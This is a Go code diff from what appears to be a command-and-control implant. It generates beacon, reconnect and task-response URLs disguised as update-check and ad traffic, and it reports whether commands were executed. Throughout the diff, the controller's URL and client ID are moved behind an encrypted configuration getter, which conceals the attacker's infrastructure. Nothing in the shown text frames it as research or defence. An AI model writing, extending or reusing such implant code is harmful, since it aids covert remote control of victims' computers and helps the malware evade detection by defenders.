@@ -250,11 +250,17 @@ func getRandomElement(slice []string) string {
 }
 
 func GenerateURLWithPath(path string) (string, error) {
-	if config.URL == "" {
+	// Get URL safely (auto-decrypts if needed)
+	baseURL, err := config.GetURL()
+	if err != nil {
+		logger.Error(fmt.Sprintf("Failed to get URL: %v", err))
+		return "", fmt.Errorf("failed to get URL: %w", err)
+	}
+	if baseURL == "" {
 		logger.Error("baseURL is not set.")
 		return "", fmt.Errorf("baseURL is not set")
 	}
-	return config.URL + path, nil
+	return baseURL + path, nil
 }
 
 func GenerateConnectionURL() string {
@@ -264,7 +270,15 @@ func GenerateConnectionURL() string {
 	adParam := getRandomElement(adDownloadUrlParams)
 	version := rand.Intn(10) + 1
 	uuid := generateUUID()
-	url := fmt.Sprintf("%s/%s/%s/%s/api/v%d?user=%s", config.URL, part1, part2, adParam, version, uuid)
+
+	// Get URL safely (auto-decrypts if needed)
+	baseURL, err := config.GetURL()
+	if err != nil {
+		logger.Error(fmt.Sprintf("Failed to get URL: %v", err))
+		baseURL = config.URL // Fallback to direct access
+	}
+
+	url := fmt.Sprintf("%s/%s/%s/%s/api/v%d?user=%s", baseURL, part1, part2, adParam, version, uuid)
 	logger.Log("generateConnectionURL: Generated Connection URL: " + url)
 	return url
 }
@@ -276,7 +290,15 @@ func GenerateReconnectURL() string {
 	// version not used in URL formation but generated in C++; kept here for similarity.
 	_ = rand.Intn(10) + 1
 	uuid := generateUUID()
-	url := fmt.Sprintf("%s/%s/%s/getLatest?token=%s", config.URL, part1, adParam, uuid)
+
+	// Get URL safely (auto-decrypts if needed)
+	baseURL, err := config.GetURL()
+	if err != nil {
+		logger.Error(fmt.Sprintf("Failed to get URL: %v", err))
+		baseURL = config.URL // Fallback to direct access
+	}
+
+	url := fmt.Sprintf("%s/%s/%s/getLatest?token=%s", baseURL, part1, adParam, uuid)
 	logger.Log("generateReconnectURL: Generated Reconnect URL: " + url)
 	return url
 }
@@ -286,8 +308,21 @@ func GenerateBeaconURL() string {
 	part1 := getRandomElement(webDirectories)
 	part2 := getRandomElement(webDirectories)
 	version := rand.Intn(10) + 1
-	// Assuming config.ID holds the equivalent of the C++ global ID.
-	url := fmt.Sprintf("%s/checkUpdates/%s/%s?session=%s&v=%d", config.URL, part1, part2, config.ID, version)
+
+	// Get URL and ID safely (auto-decrypts if needed)
+	baseURL, err := config.GetURL()
+	if err != nil {
+		logger.Error(fmt.Sprintf("Failed to get URL: %v", err))
+		baseURL = config.URL // Fallback to direct access
+	}
+
+	clientID, err := config.GetID()
+	if err != nil {
+		logger.Error(fmt.Sprintf("Failed to get ID: %v", err))
+		clientID = config.ID // Fallback to direct access
+	}
+
+	url := fmt.Sprintf("%s/checkUpdates/%s/%s?session=%s&v=%d", baseURL, part1, part2, clientID, version)
 	logger.Log("generateBeaconURL: Generated Beacon URL: " + url)
 	return url
 }
@@ -302,7 +337,15 @@ func GenerateResponseURL() string {
 		executedStr = "true"
 	}
 	uuid := generateUUID()
-	url := fmt.Sprintf("%s/updateReport/%s/api/v%d?Executed=%s&responseID=%s", config.URL, part1, version, executedStr, uuid)
+
+	// Get URL safely (auto-decrypts if needed)
+	baseURL, err := config.GetURL()
+	if err != nil {
+		logger.Error(fmt.Sprintf("Failed to get URL: %v", err))
+		baseURL = config.URL // Fallback to direct access
+	}
+
+	url := fmt.Sprintf("%s/updateReport/%s/api/v%d?Executed=%s&responseID=%s", baseURL, part1, version, executedStr, uuid)
 	logger.Log("generateResponseURL: Generated Response URL: " + url)
 	return url
 }
